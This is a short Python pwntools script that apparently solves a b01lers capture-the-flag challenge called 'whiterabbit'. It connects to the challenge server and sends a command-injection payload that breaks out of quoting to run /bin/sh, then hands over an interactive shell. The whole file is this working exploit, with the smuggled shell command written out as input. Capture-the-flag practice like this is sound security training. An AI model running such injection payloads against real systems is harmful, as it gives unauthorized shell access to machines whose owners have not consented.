#!/usr/bin/env python3

from pwn import *

exe = ELF("./whiterabbit-cacd63e38e13130a3381342eacfbb623")

context.binary = exe


def conn():
        return process([exe.path])


def main():
    #r = conn()
    r = remote("chal.ctf.b01lers.com", 1013)
    r.sendlineafter(": ", """'";/bin/sh;'""") # Command injection.

    r.interactive()


if __name__ == "__main__":
    main()
